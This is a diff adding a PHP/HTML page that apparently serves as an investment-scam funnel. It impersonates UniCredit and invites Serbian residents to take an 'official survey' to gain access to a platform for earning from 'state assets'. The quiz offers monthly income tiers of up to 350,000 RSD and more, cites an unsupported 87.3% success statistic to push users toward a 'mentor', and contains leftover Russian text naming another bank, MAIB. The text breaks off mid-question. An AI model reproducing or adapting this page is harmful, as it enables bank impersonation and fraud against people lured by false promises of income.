@@ -1,0 +1,1576 @@
+<?php include_once 'config.php'; ?>
+<!DOCTYPE html>
+<html lang="sr">
+  <head>
+    <base href="<?php echo $host ?>" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Uradite službeni test i pristupite platformi!</title>
+    <link rel="shortcut icon" href="assets/images/favicon-16x16.png" />
+    <link rel="stylesheet" href="assets/css/chunk-vendors.css" />
+    <link rel="stylesheet" href="assets/css/app.css" />
+    <link rel="stylesheet" href="assets/css/final-page.css" />
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <link rel="stylesheet" href="assets/css/index.css" media="all" />
+    <script src="assets/js/jquery.min.js"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/19.5.3/css/intlTelInput.css"
+      integrity="sha512-Hjsts+5q0OWXb6jem9SwlTyJKJpnAXrTtoKIzKeekwUFG6QesBqmr/5+NBXiimtCEUphi7Os72nrefhPbCYqtA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+  </head>
+
+  <body>
+    <span id="warning-container"><i data-reactroot></i></span>
+    <div class="header1 active"></div>
+    <div
+      class="app-wrapper light-blue"
+      style="
+        --color: #c82527;
+        --color-lighten: #005587;
+        --color-lighten10: #005587;
+        --color-lighten2: #005587;
+        --color-darken: #002d75;
+        --color-darken10: #0041a8;
+        --color-alpha: rgba(0, 84, 221, 0.5);
+        --color-alpha2: rgba(0, 84, 221, 0.2);
+        --color-alpha3: rgba(0, 84, 221, 0.05);
+        --color-text: #ffffff;
+        --color-text2: #0054dd;
+        --gradient-main: 331deg, rgb(0, 45, 117), rgb(66, 139, 255);
+        --color-primary-text-button: #fff;
+        --color-bg-sidebar: #f7f7f7;
+        --color-bg-1: #ededed;
+        --color-bg-2: #e6e6e6;
+        --color-bg-3: #cccccc;
+        --color-bg-4: #b3b3b3;
+        --color-bg-5: #999999;
+        --color-bg-6: rgba(0, 0, 0, 0.7);
+        --color-bg-7: #ededed;
+        --color-bg-8: #d9d9d9;
+        --color-bg-9: #363636;
+        --color-bg-text: #000000;
+        --color-bg-quiz: #ffffff;
+        --color-bg-alpha0: rgba(255, 255, 255, 0);
+        --color-bg-alpha2: rgba(0, 0, 0, 0.2);
+        --color-bg-alpha7: rgba(0, 0, 0, 0.7);
+        --color-white-label: #ffffff;
+        --color-bg-sub-text: #a6a6a6;
+        --font: Roboto, sans-serif;
+      "
+    >
+      <div id="quiz-app" class="quiz-app">
+        <div id="form-4401" class="layout">
+          <div class="layout">
+            <div class="app__start-page test-step active">
+              <div
+                class="start-page columns is-desktop-modal start-page_has_bg start-page_position_right start-page_mode_start start-page_theme_expanded"
+              >
+                <div class="start-page__bg" id="myVideo"></div>
+                <div
+                  class="start-page__content column is-5"
+                  style="z-index: 100"
+                >
+                  <div class="start-page__body">
+                    <div class="logo-holder">
+                      <img src="assets/images/logo.svg" alt="" />
+                    </div>
+                    <div class="start-page__line"></div>
+                    <h1 class="start-page__header">
+                      Mikroinvestiranje uz UniCredit je sada dostupno
+                      stanovnicima Srbije!
+                    </h1>
+                    <h2 class="start-page__subheader">
+                      Popunite zvaničnu UniCredit anketu i steknite premium
+                      pristup jedinstvenoj platformi za zaradu od državne
+                      imovine!
+                    </h2>
+                    <button
+                      class="start-page__button button is-primary is-blicked has-light-shadow next-btn"
+                      style="background-color: #c82527 !important"
+                    >
+                      <span class="icon">
+                        <svg viewBox="0 0 24 24" class="mdi-icon mdi-24px">
+                          <title>mdi-checkbox-marked-circle-outline</title>
+                          <path
+                            d="M20,12C20,16.42 16.42,20 12,20C7.58,20 4,16.42 4,12C4,7.58 7.58,4 12,4C12.76,4 13.5,4.11 14.2,4.31L15.77,2.74C14.61,2.26 13.34,2 12,2C6.48,2 2,6.48 2,12C2,17.52 6.48,22 12,22C17.52,22 22,17.52 22,12M7.91,10.08L6.5,11.5L11,16L21,6L19.59,4.58L11,13.17L7.91,10.08Z"
+                            stroke-width="0"
+                            fill-rule="nonzero"
+                          />
+                        </svg>
+                      </span>
+                      &nbsp; Pristupite
+                    </button>
+                  </div>
+                </div>
+                <div class="start-page__layer"></div>
+              </div>
+            </div>
+            <div class="quiz-container test-step">
+              <div class="quiz">
+                <div class="quiz__questions">
+                  <div class="quiz__questions-header">
+                    <div
+                      class="title quiz__question-title quiz__question-title_without-title"
+                    >
+                      <span class="is-block"
+                        >Da li imate listu želja i planova?</span
+                      >
+                    </div>
+                  </div>
+                  <div
+                    class="question quiz__question question_variants"
+                    id="DJ17A5860g"
+                  >
+                    <div class="answer-variants answer-variants_has_image">
+                      <div
+                        class="answer-variants__group"
+                        data-question="Есть ли у Вас список желаний и планов?"
+                        data-questionNew="1"
+                      >
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Da, imam"
+                          data-answerNew="a"
+                          style
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step1"
+                              value="Da, imam&nbsp;"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Da, imam</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Ne"
+                          data-answerNew="b"
+                          style
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step1"
+                              value="Ne"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Ne</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="answer-variants__image">
+                        <img
+                          src="assets/images/1.png"
+                          alt
+                          class="answer-variants__image-img"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div
+                    class="quiz__whitelabel quiz__whitelabel_mobile"
+                    style="
+                      display: block !important;
+                      visibility: visible !important;
+                      opacity: 1 !important;
+                    "
+                  ></div>
+                  <div class="quiz__buttons">
+                    <div class="quiz-buttons is-outline">
+                      <div class="quiz-buttons__progress">
+                        <div class="progress-bar">
+                          <div class="progress-bar-circular-steps">
+                            <div class="progress-bar-circular-steps__label">
+                              Pitanje 1 od 8
+                            </div>
+                            <div
+                              class="progress-bar-circular-steps__gradient-wrapp"
+                            >
+                              <div
+                                class="progress-bar-circular-steps__steps"
+                                style="left: 0px"
+                              >
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <button
+                        disabled="disabled"
+                        class="button is-link quiz-buttons__button quiz-buttons__button_prev is-outline"
+                      >
+                        leđa
+                      </button>
+                      <button
+                        class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn"
+                      >
+                        <span class="quiz-buttons__button_next-text"
+                          >Unaprijediti</span
+                        >
+                      </button>
+                      <span class="quiz-buttons__hint"></span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="quiz-container test-step">
+              <div class="quiz">
+                <div class="quiz__questions">
+                  <div class="quiz__questions-header">
+                    <div
+                      class="title quiz__question-title quiz__question-title_without-title"
+                    >
+                      <span class="is-block"
+                        >Da li ste čuli da UniCredit projekat pruža mogućnosti
+                        za pristup međunarodnoj imovini sa visokim prihodom?
+                      </span>
+                    </div>
+                  </div>
+                  <div
+                    class="question quiz__question question_variants"
+                    id="DJ17A5860g"
+                  >
+                    <div class="answer-variants answer-variants_has_image">
+                      <div
+                        class="answer-variants__group"
+                        data-question="Слышали ли Вы что проект от “MAIB” даёт возможности выхода на международные высокодоходные активы"
+                        data-questionNew="2"
+                      >
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Da, jesam"
+                          data-answerNew="a"
+                          style
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step1"
+                              value="Da, jesam&nbsp;"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Da, jesam</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Ne, ali bih voleo da znam više."
+                          data-answerNew="b"
+                          style
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step1"
+                              value="Ne, ali bih voleo da znam više.&nbsp;"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Ne, ali bih voleo da znam više.
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="answer-variants__image">
+                        <img
+                          src="assets/images/2.png"
+                          alt
+                          class="answer-variants__image-img"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div
+                    class="quiz__whitelabel quiz__whitelabel_mobile"
+                    style="
+                      display: block !important;
+                      visibility: visible !important;
+                      opacity: 1 !important;
+                    "
+                  ></div>
+                  <div class="quiz__buttons">
+                    <div class="quiz-buttons is-outline">
+                      <div class="quiz-buttons__progress">
+                        <div class="progress-bar">
+                          <div class="progress-bar-circular-steps">
+                            <div class="progress-bar-circular-steps__label">
+                              Pitanje 2 od 8
+                            </div>
+                            <div
+                              class="progress-bar-circular-steps__gradient-wrapp"
+                            >
+                              <div
+                                class="progress-bar-circular-steps__steps"
+                                style="left: 0px"
+                              >
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <button
+                        disabled="disabled"
+                        class="button is-link quiz-buttons__button quiz-buttons__button_prev is-outline"
+                      >
+                        leđa
+                      </button>
+                      <button
+                        class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn"
+                      >
+                        <span class="quiz-buttons__button_next-text"
+                          >Unaprijediti</span
+                        >
+                      </button>
+                      <span class="quiz-buttons__hint"></span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="quiz-container test-step">
+              <div class="quiz">
+                <div class="quiz__questions">
+                  <div class="quiz__questions-header">
+                    <div
+                      class="title quiz__question-title quiz__question-title_without-title"
+                    >
+                      <span class="is-block"
+                        >Koji mesečni iznos bi Vam bio dovoljan da ispunite
+                        svoje želje?
+                      </span>
+                    </div>
+                  </div>
+                  <div
+                    class="question quiz__question question_variants"
+                    id="DJ17A5860g"
+                  >
+                    <div class="answer-variants answer-variants_has_image">
+                      <div
+                        class="answer-variants__group"
+                        data-question="Какой суммы в месяц Вам бы было достаточно для исполнения своих желаний?"
+                        data-questionNew="3"
+                      >
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="120,000 RSD"
+                          data-answerNew="a"
+                          style
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step2"
+                              value="120,000 RSD&nbsp;"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">120,000 RSD</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="200,000 RSD"
+                          data-answerNew="b"
+                          style
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step2"
+                              value="200,000 RSD&nbsp;"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">200,000 RSD</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="280,000 RSD"
+                          data-answerNew="c"
+                          style
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step2"
+                              value="280,000 RSD"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">280,000 RSD</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="350,000 RSD and above"
+                          data-answerNew="d"
+                          style
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step2"
+                              value="350,000 RSD and above"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  350,000 RSD and above
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="answer-variants__image">
+                        <img
+                          src="assets/images/3.png"
+                          alt
+                          class="answer-variants__image-img"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div
+                    class="quiz__whitelabel quiz__whitelabel_mobile"
+                    style="
+                      display: block !important;
+                      visibility: visible !important;
+                      opacity: 1 !important;
+                    "
+                  ></div>
+                  <div class="quiz__buttons">
+                    <div class="quiz-buttons is-outline">
+                      <div class="quiz-buttons__progress">
+                        <div class="progress-bar">
+                          <div class="progress-bar-circular-steps">
+                            <div class="progress-bar-circular-steps__label">
+                              Pitanje 3 od 8
+                            </div>
+                            <div
+                              class="progress-bar-circular-steps__gradient-wrapp"
+                            >
+                              <div
+                                class="progress-bar-circular-steps__steps"
+                                style="left: 0px"
+                              >
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <button
+                        disabled="disabled"
+                        class="button is-link quiz-buttons__button quiz-buttons__button_prev is-outline"
+                      >
+                        leđa
+                      </button>
+                      <button
+                        class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn"
+                      >
+                        <span class="quiz-buttons__button_next-text"
+                          >Unaprijediti</span
+                        >
+                      </button>
+                      <span class="quiz-buttons__hint"></span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="quiz-container test-step">
+              <div class="quiz">
+                <div class="quiz__questions">
+                  <div class="quiz__questions-header">
+                    <div
+                      class="title quiz__question-title quiz__question-title_without-title"
+                    >
+                      <span class="is-block">350,000 RSD and above</span>
+                    </div>
+                  </div>
+                  <div
+                    class="question quiz__question question_variants"
+                    id="DJ17A5860g"
+                  >
+                    <div class="answer-variants answer-variants_has_image">
+                      <div
+                        class="answer-variants__group"
+                        data-question="Куда бы Вы потратили заработанные деньги"
+                        data-questionNew="4"
+                      >
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="отOtplatio bih kredit/hipotekuвет"
+                          data-answerNew="a"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step4"
+                              value="Otplatio bih kredit/hipoteku"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Otplatio bih kredit/hipoteku
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Pomogao bih svojoj porodici"
+                          data-answerNew="b"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step4"
+                              value="Pomogao bih svojoj porodici"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Pomogao bih svojoj porodici
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Uložio bih da zaradim više"
+                          data-answerNew="c"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step4"
+                              value="Uložio bih da zaradim više"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Uložio bih da zaradim više
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="answer-variants__image">
+                        <img
+                          src="assets/images/4.png"
+                          alt
+                          class="answer-variants__image-img"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div
+                    class="quiz__whitelabel quiz__whitelabel_mobile"
+                    style="
+                      display: block !important;
+                      visibility: visible !important;
+                      opacity: 1 !important;
+                    "
+                  ></div>
+                  <div class="quiz__buttons">
+                    <div class="quiz-buttons is-outline">
+                      <div class="quiz-buttons__progress">
+                        <div class="progress-bar">
+                          <div class="progress-bar-circular-steps">
+                            <div class="progress-bar-circular-steps__label">
+                              Pitanje 4 od 8
+                            </div>
+                            <div
+                              class="progress-bar-circular-steps__gradient-wrapp"
+                            >
+                              <div
+                                class="progress-bar-circular-steps__steps"
+                                style="left: 0px"
+                              >
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <button
+                        disabled="disabled"
+                        class="button is-link quiz-buttons__button quiz-buttons__button_prev is-outline"
+                      >
+                        leđa
+                      </button>
+                      <button
+                        class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn"
+                      >
+                        <span class="quiz-buttons__button_next-text"
+                          >Unaprijediti</span
+                        >
+                      </button>
+                      <span class="quiz-buttons__hint"></span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="quiz-container test-step">
+              <div class="quiz">
+                <div class="quiz__questions">
+                  <div class="quiz__questions-header">
+                    <div
+                      class="title quiz__question-title quiz__question-title_without-title"
+                    >
+                      <span class="is-block"
+                        >Imate li iskustva sa investiranjem?</span
+                      >
+                    </div>
+                  </div>
+                  <div
+                    class="question quiz__question question_variants"
+                    id="DJ17A5860g"
+                  >
+                    <div class="answer-variants answer-variants_has_image">
+                      <div
+                        class="answer-variants__group"
+                        data-question="Imate li iskustva sa investiranjem?"
+                        data-questionNew="5"
+                      >
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Ne, ali voleo bih da znam više"
+                          data-answerNew="a"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Ne, ali voleo bih da znam više"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Ne, ali voleo bih da znam više
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Da, uspešno"
+                          data-answerNew="b"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Da, uspešno"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Da, uspešno</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Da, neuspešno"
+                          data-answerNew="c"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Da, neuspešno"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Da, neuspešno</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="answer-variants__image">
+                        <img
+                          src="assets/images/5.png"
+                          alt
+                          class="answer-variants__image-img"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div
+                    class="quiz__whitelabel quiz__whitelabel_mobile"
+                    style="
+                      display: block !important;
+                      visibility: visible !important;
+                      opacity: 1 !important;
+                    "
+                  ></div>
+                  <div class="quiz__buttons">
+                    <div class="quiz-buttons is-outline">
+                      <div class="quiz-buttons__progress">
+                        <div class="progress-bar">
+                          <div class="progress-bar-circular-steps">
+                            <div class="progress-bar-circular-steps__label">
+                              Pitanje 5 od 8
+                            </div>
+                            <div
+                              class="progress-bar-circular-steps__gradient-wrapp"
+                            >
+                              <div
+                                class="progress-bar-circular-steps__steps"
+                                style="left: 0px"
+                              >
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <button
+                        disabled="disabled"
+                        class="button is-link quiz-buttons__button quiz-buttons__button_prev is-outline"
+                      >
+                        leđa
+                      </button>
+                      <button
+                        class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn"
+                      >
+                        <span class="quiz-buttons__button_next-text"
+                          >Unaprijediti</span
+                        >
+                      </button>
+                      <span class="quiz-buttons__hint"></span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="quiz-container test-step">
+              <div class="quiz">
+                <div class="quiz__questions">
+                  <div class="quiz__questions-header">
+                    <div
+                      class="title quiz__question-title quiz__question-title_without-title"
+                    >
+                      <span class="is-block"
+                        >Ulaganjem gradite svoj investicioni portfelj. Koje
+                        aksije Vas najviše interesuju?</span
+                      >
+                    </div>
+                  </div>
+                  <div
+                    class="question quiz__question question_variants"
+                    id="DJ17A5860g"
+                  >
+                    <div class="answer-variants answer-variants_has_image">
+                      <div
+                        class="answer-variants__group"
+                        data-question="Ulaganjem gradite svoj investicioni portfelj. Koje aksije Vas najviše interesuju?"
+                        data-questionNew="6"
+                      >
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Strane"
+                          data-answerNew="a"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Strane"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Strane</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Srpske"
+                          data-answerNew="b"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Srpske"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Srpske</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Nije važno, bitna je zarada."
+                          data-answerNew="c"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Nije važno, bitna je zarada."
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Nije važno, bitna je zarada.
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="answer-variants__image">
+                        <img
+                          src="assets/images/6.png"
+                          alt
+                          class="answer-variants__image-img"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div
+                    class="quiz__whitelabel quiz__whitelabel_mobile"
+                    style="
+                      display: block !important;
+                      visibility: visible !important;
+                      opacity: 1 !important;
+                    "
+                  ></div>
+                  <div class="quiz__buttons">
+                    <div class="quiz-buttons is-outline">
+                      <div class="quiz-buttons__progress">
+                        <div class="progress-bar">
+                          <div class="progress-bar-circular-steps">
+                            <div class="progress-bar-circular-steps__label">
+                              Pitanje 6 od 8
+                            </div>
+                            <div
+                              class="progress-bar-circular-steps__gradient-wrapp"
+                            >
+                              <div
+                                class="progress-bar-circular-steps__steps"
+                                style="left: 0px"
+                              >
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <button
+                        disabled="disabled"
+                        class="button is-link quiz-buttons__button quiz-buttons__button_prev is-outline"
+                      >
+                        leđa
+                      </button>
+                      <button
+                        class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn"
+                      >
+                        <span class="quiz-buttons__button_next-text"
+                          >Unaprijediti</span
+                        >
+                      </button>
+                      <span class="quiz-buttons__hint"></span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="quiz-container test-step">
+              <div class="quiz">
+                <div class="quiz__questions">
+                  <div class="quiz__questions-header">
+                    <div
+                      class="title quiz__question-title quiz__question-title_without-title"
+                    >
+                      <span class="is-block"
+                        >Prema statistikama, uspeh učesnika je 87,3% veći u radu
+                        sa mentorom. Znajući ove informacije, kako biste želeli
+                        da radite?</span
+                      >
+                    </div>
+                  </div>
+                  <div
+                    class="question quiz__question question_variants"
+                    id="DJ17A5860g"
+                  >
+                    <div class="answer-variants answer-variants_has_image">
+                      <div
+                        class="answer-variants__group"
+                        data-question="Prema statistikama, uspeh učesnika je 87,3% veći u radu sa mentorom. Znajući ove informacije, kako biste želeli da radite?"
+                        data-questionNew="7"
+                      >
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Uz pomoć iskusnog mentora"
+                          data-answerNew="a"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Uz pomoć iskusnog mentora"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Uz pomoć iskusnog mentora
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Nezavisno"
+                          data-answerNew="b"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
